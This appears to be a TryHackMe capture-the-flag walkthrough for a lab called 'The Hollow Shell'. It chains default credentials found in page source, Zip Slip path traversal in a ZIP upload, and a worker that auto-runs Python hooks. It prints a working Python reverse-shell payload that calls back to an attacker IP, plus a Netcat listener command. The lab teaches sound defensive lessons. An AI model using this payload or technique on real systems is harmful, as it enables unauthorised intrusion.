##TryHackMe — The Hollow Shell
---

# This walkthrough describes the complete attack path for the The Hollow Shell TryHackMe room.

The room involves network enumeration, web application reconnaissance, source-code inspection, default credential discovery, insecure ZIP extraction, Zip Slip path traversal, and abuse of a background automation worker to obtain remote code execution.

The attack begins with enumeration of the web application and progresses from hardcoded credentials to a vulnerable shell-upload feature, eventually resulting in a reverse shell as the roomservice user.

Difficulty — Medium

`MACHINE-IP: 10.114.180.237`

`ATTACKER-IP: 192.168.134.177`

Initial Access
Scanning

I started by enumerating the open TCP ports and identifying the services running on the target.

The target was:

10.114.180.237


I used Nmap with default scripts, service detection, and a full TCP port scan:

nmap -sC -sV -p- 10.114.180.237


The scan revealed two accessible services:

22/tcp — SSH
5000/tcp — Gunicorn web application


SSH was exposed, but I had no credentials for it yet, so I focused my attention on the web application running on port 5000.

I opened:

http://10.114.180.237:5000


This presented a login page for the Byte Lotus internal display-manager portal.

Web Enumeration

The login page itself did not immediately reveal any credentials.

I decided to inspect the page source for comments, JavaScript, and other information that might have been accidentally exposed by the developers.

This turned out to be the right approach.

Inside the source code I found an HTML comment:

<!-- Byte Lotus // internal display-manager portal
New on the floor team? IT seeds every property with the same
starter login until you set your own:
user: concierge
pass: StayNoticed2024!
(rotate it from Settings on first sign-in — most people forget) -->


The comment revealed a set of default credentials:

Username: concierge
Password: StayNoticed2024!


The message also indicated that these were intended to be changed after the first login, but that users often forgot to rotate them.

I tried the credentials against the login form.

They worked.

I was now authenticated to the Byte Lotus display-management portal.

Display Manager Dashboard

After logging in, I was presented with the main dashboard.

The most interesting functionality was the ability to upload a shell.

The application described a shell as a ZIP archive containing a manifest named:

shell.json


The dashboard also provided some information about how shells were processed.

The important details were:

Shell format: ZIP
Required manifest: shell.json
Allowed assets:
png
jpg
gif
svg
css
json


There was also an interesting reference to:

automation hooks


The dashboard explained that optional automation hooks were applied by a background theme worker after the shell was uploaded.

This suggested that the upload functionality might involve more than simply storing static files.

I therefore began testing exactly how the upload functionality behaved.

Shell Upload Testing

I created a minimal ZIP archive containing only a shell.json file.

My first manifest was:

{}


The application rejected it with an error indicating that the name field was missing.

I then created:

{
	"name": "test-shell"
}


This time the upload was accepted.

I continued experimenting with the manifest and added an empty hooks array:

{
	"name": "test-shell",
	"hooks": []
}


This was also accepted.

I then tried:

{
	"name": "test-shell",
	"hooks": [
		{}
	]
}


This was accepted as well.

At this point I began testing different command-related keys inside the hook objects, including things such as:

type
command
run
exec
cmd


The values were stored by the application, but nothing appeared to execute.

This suggested that the hooks field inside shell.json was not itself enough to trigger command execution.

I therefore changed direction and began investigating how the ZIP archive was extracted.

Zip Slip

Because the application accepted user-controlled ZIP archives, one of the first things I wanted to test was whether the extraction process protected against path traversal.

I created a ZIP containing a legitimate shell.json along with a deliberately malicious filename:

../../static/hello_from_zip.txt


I uploaded the archive through the dashboard.

The file was successfully extracted.

I was then able to access the planted file through:

http://10.114.180.237:5000/shells/static/hello_from_zip.txt


After a short delay, the file was also accessible directly under:

/static/


This confirmed that the archive extraction was vulnerable to Zip Slip.

The important discovery was that the ZIP extraction process allowed ../ path traversal.

The directory structure effectively allowed me to escape the individual shell directory and write elsewhere within the application.

Understanding the Extraction Path

The successful traversal allowed me to determine more about the application's filesystem layout.

The shell itself was stored under a directory similar to:

shells/<shell-id>/


Using:

../../


allowed me to escape the shell directory and reach the application root.

I had now established that:

shells/
static/
hooks/


were likely sibling directories beneath the application root.

The static/ directory was already confirmed through the Zip Slip test.

The remaining question was whether I could use the same primitive to write somewhere that would actually be processed by the application.

Dead Ends

I spent some time testing several possible ways of turning the arbitrary file-write primitive into code execution.

One obvious idea was to upload a PHP web shell.

That did not work.

The target was running a Python/Gunicorn application, meaning that placing a .php file somewhere under the web root would simply result in the file being served as static content rather than executed by PHP.

I also tried placing files exclusively under:

/shells/static/


Those files were reachable, but nothing executed them.

The hooks array inside shell.json was another dead end.

Although the application accepted and stored values in the array, none of the command-related values I supplied caused a command to execute.

At this point, I knew I had an arbitrary file-write primitive within the application root, but I still needed to determine what location the background worker actually monitored.

Discovering the Theme Worker

I went back to the wording used by the dashboard:

Optional automation hooks are applied by a background theme worker.


The phrase automation hooks suggested that the worker might not be executing commands directly from the JSON manifest.

Instead, it could be watching a specific directory for Python hook files.

Since I had already established that:

static/


was a sibling of:

shells/


I began looking for another sibling directory that matched the terminology used by the application.

The obvious candidate was:

hooks/


I therefore created another ZIP archive.

This time, instead of writing into static/, I used Zip Slip to place a Python file at:

../../hooks/poc.py


The archive still contained a valid shell.json:

{
	"name": "python-test",
	"assets": []
}


I uploaded the archive through the dashboard.

The Python file appeared in the expected location.

More importantly, shortly afterward the theme worker executed the file.

This was the missing piece.

The worker was monitoring the hooks/ directory and automatically executing Python files placed there.

I now had a reliable path from the web application's file-upload functionality to remote code execution.

Remote Code Execution

The exploitation chain was now clear:

Authenticated Upload
↓
Malicious ZIP
↓
Zip Slip
↓
../../hooks/
↓
Python Hook
↓
Theme Worker
↓
Code Execution


The remaining step was to turn this code execution into an interactive shell.

I prepared a Python reverse-shell payload.

My attacking machine was:

192.168.134.177


I chose port:

4444

Reverse Shell

I started a Netcat listener on my attacking machine:

nc -lvnp 4444


I then created a malicious ZIP archive containing a valid shell.json and a Python reverse-shell payload at:

../../hooks/shell.py


The Python script was:

import os
import pty
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.134.177", 4444))

for descriptor in (0, 1, 2):
	os.dup2(sock.fileno(), descriptor)
	
	pty.spawn("/bin/bash")
	
	
	The important part was the ZIP path:
	
	../../hooks/shell.py
	
	
	This caused the file to escape the normal shell extraction directory and land directly inside the directory monitored by the theme worker.
	
	I uploaded the malicious ZIP through the Byte Lotus dashboard.
	
	After a few seconds, the background worker picked up the Python file and executed it.
	
	My listener received the incoming connection.
	
	I had obtained a reverse shell.
	
	Shell Access
	
	The reverse shell was running as:
	
	roomservice
	
	
	I confirmed the current user:
	
	whoami
	
	
	The result was:
	
	roomservice
	
	
	This confirmed successful remote code execution and operating-system access.
	
	The complete exploitation path to this point was:
	
	Default Credentials
	↓
	Byte Lotus Dashboard
	↓
	Shell Upload
	↓
	Zip Slip
	↓
	Arbitrary File Write
	↓
	../../hooks/shell.py
	↓
	Theme Worker
	↓
	Python Execution
	↓
	Reverse Shell
	↓
	roomservice
	
	Reading the Flag
	
	With a shell as roomservice, I checked the user's home directory:
	
	ls -la /home/roomservice
	
	
	The flag was present at:
	
	/home/roomservice/flag.txt
	
	
	I read it with:
	
	cat /home/roomservice/flag.txt
	
	
	This completed the main attack path.
	
	Room Completed
	
	The room was completed by chaining together several weaknesses in the Byte Lotus application.
	
	The complete attack path was:
	
	Scan the target with Nmap.
	Discover SSH and the Gunicorn application on port 5000.
	Enumerate the Byte Lotus login page.
	Inspect the page source.
	Discover the hardcoded concierge credentials.
	Authenticate to the display-manager portal.
	Investigate the shell-upload functionality.
	Determine that shell.json required a name field.
	Test the hooks functionality.
	Determine that hook values alone did not trigger execution.
	Test ZIP extraction for path traversal.
	Confirm a Zip Slip vulnerability.
	Use ../../ to escape the shell extraction directory.
	Determine that static/ was reachable outside the shell directory.
	Identify the hooks/ directory as the likely worker location.
	Write a Python proof-of-concept to ../../hooks/poc.py.
	Confirm that the background theme worker executed the Python file.
	Create a Python reverse shell.
	Place it at ../../hooks/shell.py using Zip Slip.
	Start a Netcat listener on the AttackBox.
	Upload the malicious ZIP.
	Wait for the theme worker to execute the payload.
	Receive a reverse shell as roomservice.
	Read /home/roomservice/flag.txt.
	Final Attack Chain
	Nmap Enumeration
	↓
	Gunicorn Web Application
	↓
	Source Code Inspection
	↓
	Hardcoded Credentials
	↓
	concierge
	↓
	Shell Upload
	↓
	ZIP Extraction
	↓
	Zip Slip
	↓
	Arbitrary File Write
	↓
	../../hooks/
	↓
	Python Hook
	↓
	Theme Worker
	↓
	Remote Code Execution
	↓
	Python Reverse Shell
	↓
	roomservice
	↓
	/home/roomservice/flag.txt
	
	Conclusion
	
	The Byte Lotus room demonstrates how a seemingly simple file-upload feature can become a complete remote-code-execution vulnerability when multiple weaknesses are chained together.
	
	The initial access came from credentials accidentally exposed in the HTML source:
	
	concierge
	StayNoticed2024!
	
	
	After authenticating, the shell-upload functionality provided the key attack surface.
	
	Although the application attempted to validate the contents of the uploaded ZIP and required a valid shell.json, it failed to securely handle archive extraction. By supplying filenames containing:
	
	../../
	
	
	I was able to escape the intended extraction directory and write files elsewhere in the application's filesystem.
	
	The crucial discovery was the application's background theme worker. The worker monitored the hooks/ directory and automatically executed Python files placed there.
	
	Combining these two vulnerabilities produced a straightforward RCE chain:
	
	Default Credentials
	→ Authenticated File Upload
	→ Zip Slip
	→ Arbitrary File Write
	→ Python Hook
	→ Theme Worker Execution
	→ Reverse Shell
	→ roomservice
	
	
	Once the reverse shell was obtained as roomservice, the final flag could be read from:
	
	/home/roomservice/flag.txt
	
	
	The room ultimately demonstrates why archive extraction must carefully prevent path traversal and why background workers that automatically execute uploaded content can turn a file-write vulnerability into full remote code execution.
